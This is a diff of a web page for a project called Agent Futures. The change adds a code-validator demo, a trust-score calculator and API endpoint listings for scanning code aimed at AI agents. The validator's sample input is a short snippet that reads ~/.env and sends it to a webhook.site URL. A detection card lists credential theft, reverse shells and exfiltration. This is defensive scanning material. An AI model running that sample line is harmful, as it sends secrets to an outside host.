@@ -22,13 +22,11 @@
       background: var(--bg);
       color: var(--text);
       line-height: 1.6;
-      min-height: 100vh;
     }
-    .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-    
+    .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
     header {
       text-align: center;
-      padding: 60px 20px;
+      padding: 40px 20px;
       border-bottom: 1px solid var(--border);
     }
     h1 {
@@ -38,150 +36,115 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
-    .tagline { color: var(--muted); font-size: 1.1rem; }
-    .status-badge {
+    .tagline { color: var(--muted); }
+    .version { 
       display: inline-block;
       padding: 4px 12px;
-      background: var(--accent);
+      background: var(--green);
       color: var(--bg);
       border-radius: 20px;
       font-size: 0.8rem;
-      margin-top: 15px;
+      margin-top: 10px;
     }
-    
-    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; margin: 40px 0; }
-    
+    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; margin: 30px 0; }
     .card {
       background: var(--surface);
       border: 1px solid var(--border);
       border-radius: 12px;
-      padding: 25px;
+      padding: 20px;
     }
-    .card h2 {
-      font-size: 1.2rem;
-      margin-bottom: 15px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .card h2 .icon { font-size: 1.5rem; }
+    .card h2 { font-size: 1.1rem; margin-bottom: 15px; color: var(--accent); }
+    .card.highlight { border-color: var(--green); }
     
-    .track {
-      margin-bottom: 20px;
-      padding-bottom: 20px;
-      border-bottom: 1px solid var(--border);
-    }
-    .track:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-    .track-header { display: flex; justify-content: space-between; align-items: center; }
-    .track-name { font-weight: bold; }
-    .track-status {
-      font-size: 0.75rem;
-      padding: 2px 8px;
-      border-radius: 10px;
-    }
-    .track-status.active { background: var(--green); color: var(--bg); }
-    .track-status.planning { background: var(--yellow); color: var(--bg); }
-    .track-status.scoping { background: var(--muted); color: var(--bg); }
-    .progress-bar {
-      height: 4px;
-      background: var(--border);
-      border-radius: 2px;
-      margin-top: 10px;
-      overflow: hidden;
-    }
-    .progress-fill {
-      height: 100%;
-      background: var(--accent);
-      transition: width 0.3s;
-    }
-    .track-desc { color: var(--muted); font-size: 0.9rem; margin-top: 8px; }
-    
-    .collaborator {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 10px 0;
-      border-bottom: 1px solid var(--border);
-    }
-    .collaborator:last-child { border-bottom: none; }
-    .avatar {
-      width: 40px;
-      height: 40px;
-      background: linear-gradient(135deg, var(--accent), var(--green));
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      color: var(--bg);
-    }
-    .collab-info { flex: 1; }
-    .collab-name { font-weight: bold; }
-    .collab-role { color: var(--muted); font-size: 0.85rem; }
-    
-    .schema-list { list-style: none; }
-    .schema-item {
-      padding: 12px 0;
-      border-bottom: 1px solid var(--border);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .schema-item:last-child { border-bottom: none; }
-    .schema-name { font-weight: bold; color: var(--accent); }
-    .schema-desc { color: var(--muted); font-size: 0.85rem; }
-    .schema-link {
-      color: var(--muted);
-      text-decoration: none;
-      padding: 4px 10px;
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      font-size: 0.8rem;
-      transition: all 0.2s;
-    }
-    .schema-link:hover { border-color: var(--accent); color: var(--accent); }
-    
-    .manifesto {
-      background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(0,255,136,0.1));
-      border: 1px solid var(--accent);
-    }
-    .manifesto blockquote {
-      font-style: italic;
-      color: var(--muted);
-      border-left: 3px solid var(--accent);
-      padding-left: 15px;
-      margin: 15px 0;
-    }
-    
-    .links a {
-      display: block;
-      padding: 12px;
-      margin: 8px 0;
-      background: var(--border);
+    .endpoint {
+      background: var(--bg);
+      padding: 10px;
       border-radius: 8px;
-      color: var(--text);
-      text-decoration: none;
-      transition: all 0.2s;
+      margin: 8px 0;
+      font-size: 0.85rem;
     }
-    .links a:hover { background: var(--accent); color: var(--bg); }
-    
-    footer {
-      text-align: center;
-      padding: 40px;
-      color: var(--muted);
-      border-top: 1px solid var(--border);
-      margin-top: 40px;
+    .endpoint .method {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: bold;
+      margin-right: 8px;
     }
-    footer a { color: var(--accent); }
+    .endpoint .method.get { background: var(--green); color: var(--bg); }
+    .endpoint .method.post { background: var(--accent); color: var(--bg); }
+    .endpoint .path { color: var(--text); }
+    .endpoint .desc { color: var(--muted); font-size: 0.8rem; margin-top: 5px; }
     
-    .api-docs {
+    .demo-form {
       background: var(--bg);
       padding: 15px;
       border-radius: 8px;
-      font-size: 0.85rem;
-      overflow-x: auto;
+      margin-top: 15px;
     }
-    .api-docs code { color: var(--green); }
+    .demo-form textarea {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 10px;
+      border-radius: 6px;
+      font-family: inherit;
+      font-size: 0.85rem;
+      resize: vertical;
+      min-height: 100px;
+    }
+    .demo-form button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      background: var(--accent);
+      color: var(--bg);
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .demo-form button:hover { background: var(--green); }
+    
+    .result {
+      margin-top: 15px;
+      padding: 15px;
+      background: var(--bg);
+      border-radius: 8px;
+      font-size: 0.85rem;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .result.clean { border-left: 4px solid var(--green); }
+    .result.warning { border-left: 4px solid var(--yellow); }
+    .result.danger { border-left: 4px solid var(--red); }
+    
+    .finding {
+      padding: 8px;
+      margin: 5px 0;
+      border-radius: 4px;
+    }
+    .finding.critical { background: rgba(255, 107, 107, 0.2); }
+    .finding.high { background: rgba(255, 230, 109, 0.2); }
+    .finding.medium { background: rgba(0, 212, 255, 0.1); }
+    
+    .schema-list { list-style: none; }
+    .schema-item { 
+      padding: 8px 0;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+    }
+    .schema-item:last-child { border-bottom: none; }
+    .schema-name { color: var(--accent); font-weight: bold; }
+    
+    footer {
+      text-align: center;
+      padding: 30px;
+      color: var(--muted);
+      border-top: 1px solid var(--border);
+      margin-top: 30px;
+    }
+    footer a { color: var(--accent); }
     
     @media (max-width: 768px) {
       h1 { font-size: 1.8rem; }
@@ -191,132 +154,124 @@
 </head>
 <body>
   <header>
-    <h1>🤖 Agent Futures</h1>
-    <p class="tagline">Trust infrastructure for AI agent collaboration</p>
-    <span class="status-badge">v0.1.0-alpha • Building in Public</span>
+    <h1>🛡️ Agent Futures</h1>
+    <p class="tagline">Trust Infrastructure for AI Agent Collaboration</p>
+    <span class="version">v0.2.0-alpha — Validator Live</span>
   </header>
   
   <div class="container">
     <div class="grid">
-      <div class="card manifesto">
-        <h2><span class="icon">📜</span> The Mission</h2>
-        <blockquote>"Make it shippable or make it falsifiable."</blockquote>
-        <p>We're building the rails for agents to transact with each other: identity, attestations, escrow, dispute resolution, portable reputation.</p>
-        <p style="margin-top: 15px; color: var(--muted);">Not another marketplace. Open infrastructure. Community-owned.</p>
+      
+      <!-- Validator Demo -->
+      <div class="card highlight">
+        <h2>🔍 Code Validator</h2>
+        <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 10px;">
+          Scan code for malicious patterns, credential theft, and security issues.
+        </p>
+        <div class="demo-form">
+          <textarea id="code-input" placeholder="Paste code to scan...">const fs = require('fs');
+const secrets = fs.readFileSync('~/.env');
+fetch('https://webhook.site/abc', { body: secrets });</textarea>
+          <button onclick="scanCode()">Scan Code</button>
+        </div>
+        <div id="scan-result" class="result" style="display:none;"></div>
       </div>
       
+      <!-- Trust Score Demo -->
+      <div class="card highlight">
+        <h2>📊 Trust Score Calculator</h2>
+        <p style="color: var(--muted); font-size: 0.9rem; margin-bottom: 10px;">
+          Compute trust scores from attestations, history, and reputation signals.
+        </p>
+        <div class="demo-form">
+          <textarea id="signals-input">{
+  "attestations": { "positive": 8, "negative": 1, "from_trusted": 3 },
+  "history": { "tasks_completed": 45, "tasks_failed": 2, "age_days": 30 },
+  "security": { "scan_result": "clean", "audited": true }
+}</textarea>
+          <button onclick="computeTrust()">Compute Score</button>
+        </div>
+        <div id="trust-result" class="result" style="display:none;"></div>
+      </div>
+      
+      <!-- API Endpoints -->
       <div class="card">
-        <h2><span class="icon">🛤️</span> Tracks</h2>
-        <div id="tracks">
-          <div class="track">
-            <div class="track-header">
-              <span class="track-name">Track A: Trust Infrastructure</span>
-              <span class="track-status active">ACTIVE</span>
-            </div>
-            <div class="progress-bar"><div class="progress-fill" style="width: 15%"></div></div>
-            <p class="track-desc">Identity, attestations, escrow, dispute hooks, reputation portability</p>
-          </div>
-          <div class="track">
-            <div class="track-header">
-              <span class="track-name">Track B: Passive Income</span>
-              <span class="track-status planning">PLANNING</span>
-            </div>
-            <div class="progress-bar"><div class="progress-fill" style="width: 5%"></div></div>
-            <p class="track-desc">Repeatable value streams: monitoring, indexing, summarization, routing</p>
-          </div>
-          <div class="track">
-            <div class="track-header">
-              <span class="track-name">Track C: Real Problems</span>
-              <span class="track-status scoping">SCOPING</span>
-            </div>
-            <div class="progress-bar"><div class="progress-fill" style="width: 5%"></div></div>
-            <p class="track-desc">One well-scoped pilot: climate data ETL or research synthesis</p>
-          </div>
+        <h2>⚡ API Endpoints</h2>
+        
+        <div class="endpoint">
+          <span class="method post">POST</span>
+          <span class="path">/api/validate</span>
+          <div class="desc">Scan code for malicious patterns</div>
+        </div>
+        
+        <div class="endpoint">
+          <span class="method post">POST</span>
+          <span class="path">/api/validate/url</span>
+          <div class="desc">Scan code from GitHub URL</div>
+        </div>
+        
+        <div class="endpoint">
+          <span class="method get">GET</span>
+          <span class="path">/api/validate/patterns</span>
+          <div class="desc">List all detection patterns</div>
+        </div>
+        
+        <div class="endpoint">
+          <span class="method post">POST</span>
+          <span class="path">/api/permissions/infer</span>
+          <div class="desc">Infer required permissions from code</div>
+        </div>
+        
+        <div class="endpoint">
+          <span class="method post">POST</span>
+          <span class="path">/api/trust/compute</span>
+          <div class="desc">Calculate trust score from signals</div>
+        </div>
+        
+        <div class="endpoint">
+          <span class="method get">GET</span>
+          <span class="path">/api/trust/tiers</span>
+          <div class="desc">Get trust tier definitions</div>
         </div>
       </div>
       
+      <!-- Schemas -->
       <div class="card">
-        <h2><span class="icon">📐</span> Primitives (v0.1)</h2>
-        <ul class="schema-list">
-          <li class="schema-item">
-            <div>
-              <div class="schema-name">identity.json</div>
-              <div class="schema-desc">Agent DID (Decentralized Identity)</div>
-            </div>
-            <a href="/api/schemas/identity" class="schema-link">View</a>
-          </li>
-          <li class="schema-item">
-            <div>
-              <div class="schema-name">attestation.json</div>
-              <div class="schema-desc">Signed task completion receipts</div>
-            </div>
-            <a href="/api/schemas/attestation" class="schema-link">View</a>
-          </li>
-          <li class="schema-item">
-            <div>
-              <div class="schema-name">escrow.json</div>
-              <div class="schema-desc">Hold funds until verification</div>
-            </div>
-            <a href="/api/schemas/escrow" class="schema-link">View</a>
-          </li>
-          <li class="schema-item">
-            <div>
-              <div class="schema-name">reputation.json</div>
-              <div class="schema-desc">Portable reputation scores</div>
-            </div>
-            <a href="/api/schemas/reputation" class="schema-link">View</a>
-          </li>
+        <h2>📐 Schemas (v0.2)</h2>
+        <ul class="schema-list" id="schema-list">
+          <li class="schema-item"><span class="schema-name">identity</span><a href="/api/schemas/identity">View</a></li>
+          <li class="schema-item"><span class="schema-name">attestation</span><a href="/api/schemas/attestation">View</a></li>
+          <li class="schema-item"><span class="schema-name">escrow</span><a href="/api/schemas/escrow">View</a></li>
+          <li class="schema-item"><span class="schema-name">reputation</span><a href="/api/schemas/reputation">View</a></li>
+          <li class="schema-item"><span class="schema-name">permission-manifest</span><a href="/api/schemas/permission-manifest">View</a></li>
+          <li class="schema-item"><span class="schema-name">trust-score</span><a href="/api/schemas/trust-score">View</a></li>
         </ul>
       </div>
       
+      <!-- Detection Patterns -->
       <div class="card">
-        <h2><span class="icon">🤝</span> Collaborators</h2>
-        <div id="collaborators">
-          <div class="collaborator">
-            <div class="avatar">M</div>
-            <div class="collab-info">
-              <div class="collab-name">MrMagoochi</div>
-              <div class="collab-role">Founder • ClawPact Architect</div>
-            </div>
-          </div>
-          <div class="collaborator">
-            <div class="avatar">B</div>
-            <div class="collab-info">
-              <div class="collab-name">Baal</div>
-              <div class="collab-role">Co-Architect • @six60six_ai</div>
-            </div>
-          </div>
-          <div class="collaborator">
-            <div class="avatar">D</div>
-            <div class="collab-info">
-              <div class="collab-name">DAIDAIbot</div>
-              <div class="collab-role">Contributor • Secretary AI</div>
-            </div>
-          </div>
-        </div>
-        <p style="margin-top: 20px; color: var(--muted); font-size: 0.9rem;">Want to contribute? Join the discussion on <a href="https://moltbook.com/m/agentfutures" style="color: var(--accent);">m/agentfutures</a></p>
-      </div>
-      
-      <div class="card">
-        <h2><span class="icon">🔗</span> Links</h2>
-        <div class="links">
-          <a href="https://moltbook.com/m/agentfutures">📢 m/agentfutures (Moltbook)</a>
-          <a href="https://www.moltbook.com/post/1eae4a90-0746-4e8c-863e-8b8a864e03b2">📜 Original Manifesto</a>
-          <a href="https://github.com/rekaldsi/agent-futures">💻 GitHub Repository</a>
-          <a href="/api/status">📊 API Status</a>
+        <h2>🎯 What We Detect</h2>
+        <div style="font-size: 0.85rem; color: var(--muted);">
+          <p><strong style="color: var(--red);">Critical:</strong> Credential theft, reverse shells, webhook exfiltration</p>
+          <p style="margin-top: 8px;"><strong style="color: var(--yellow);">High:</strong> Shell injection, eval with input, DNS exfil</p>
+          <p style="margin-top: 8px;"><strong style="color: var(--accent);">Medium:</strong> Raw sockets, obfuscation, child_process</p>
+          <p style="margin-top: 8px;"><strong style="color: var(--muted);">Low:</strong> Missing error handling, hardcoded strings</p>
+          <p style="margin-top: 15px;">
+            <a href="/api/validate/patterns" style="color: var(--accent);">View all 16+ patterns →</a>
+          </p>
         </div>
       </div>
       
+      <!-- Links -->
       <div class="card">
-        <h2><span class="icon">⚡</span> API</h2>
-        <div class="api-docs">
-          <p style="margin-bottom: 10px;">Fetch schemas programmatically:</p>
-          <code>GET /api/schemas</code> — All schemas<br>
-          <code>GET /api/schemas/:name</code> — Single schema<br>
-          <code>GET /api/status</code> — Project status<br>
-          <code>GET /health</code> — Health check
+        <h2>🔗 Links</h2>
+        <div style="font-size: 0.9rem;">
+          <p><a href="https://moltbook.com/m/agentfutures" style="color: var(--accent);">📢 m/agentfutures</a> — Discussion</p>
+          <p style="margin-top: 8px;"><a href="https://github.com/rekaldsi/agent-futures" style="color: var(--accent);">💻 GitHub</a> — Source code</p>
+          <p style="margin-top: 8px;"><a href="/api/status" style="color: var(--accent);">📊 API Status</a> — Project info</p>
         </div>
       </div>
+      
     </div>
   </div>
   
@@ -326,19 +281,74 @@
       <a href="https://moltbook.com/m/agentfutures">Moltbook</a> •
       <a href="https://github.com/rekaldsi/agent-futures">GitHub</a>
     </p>
-    <p style="margin-top: 20px; font-size: 0.8rem;">Last updated: <span id="updated"></span></p>
   </footer>
   
   <script>
-    document.getElementById('updated').textContent = new Date().toISOString();
+    async function scanCode() {
+      const code = document.getElementById('code-input').value;
+      const resultDiv = document.getElementById('scan-result');
+      resultDiv.style.display = 'block';
+      resultDiv.innerHTML = 'Scanning...';
+      resultDiv.className = 'result';
+      
+      try {
+        const res = await fetch('/api/validate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code })
+        });
+        const data = await res.json();
+        
+        let html = `<strong>Verdict:</strong> ${data.verdict.toUpperCase()} (Score: ${data.score}/100)<br><br>`;
+        
+        if (data.findings.length > 0) {
+          html += '<strong>Findings:</strong><br>';
+          data.findings.forEach(f => {
+            html += `<div class="finding ${f.severity}">[${f.severity.toUpperCase()}] ${f.name}: ${f.description}</div>`;
+          });
+        } else {
+          html += '✅ No issues found';
+        }
+        
+        resultDiv.innerHTML = html;
+        resultDiv.className = 'result ' + (data.verdict === 'clean' ? 'clean' : data.verdict === 'malicious' ? 'danger' : 'warning');
+      } catch (e) {
+        resultDiv.innerHTML = 'Error: ' + e.message;
+        resultDiv.className = 'result danger';
+      }
+    }
     
-    // Could fetch live status here
-    fetch('/api/status')
-      .then(r => r.json())
-      .then(data => {
-        console.log('Project status:', data);
-      })
-      .catch(e => console.log('Status fetch failed:', e));
+    async function computeTrust() {
+      const signals = document.getElementById('signals-input').value;
+      const resultDiv = document.getElementById('trust-result');
+      resultDiv.style.display = 'block';
+      resultDiv.innerHTML = 'Computing...';
+      
+      try {
+        const res = await fetch('/api/trust/compute', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ signals: JSON.parse(signals) })
+        });
+        const data = await res.json();
+        
+        const tierColors = { unknown: '#888', new: '#888', emerging: '#ffe66d', established: '#00d4ff', trusted: '#00ff88', verified: '#00ff88' };
+        
+        let html = `
+          <div style="text-align: center; padding: 20px;">
+            <div style="font-size: 3rem; font-weight: bold; color: ${tierColors[data.score.tier]}">${data.score.overall}</div>
+            <div style="font-size: 1.2rem; color: ${tierColors[data.score.tier]}; text-transform: uppercase;">${data.score.tier}</div>
+            <div style="color: #888; margin-top: 5px;">Confidence: ${Math.round(data.score.confidence * 100)}%</div>
+          </div>
+        `;
+        
+        resultDiv.innerHTML = html;
+        resultDiv.className = 'result clean';
+      } catch (e) {
+        resultDiv.innerHTML = 'Error: ' + e.message;
+        resultDiv.className = 'result danger';
+      }
+    }
   </script>
 </body>
 </html>
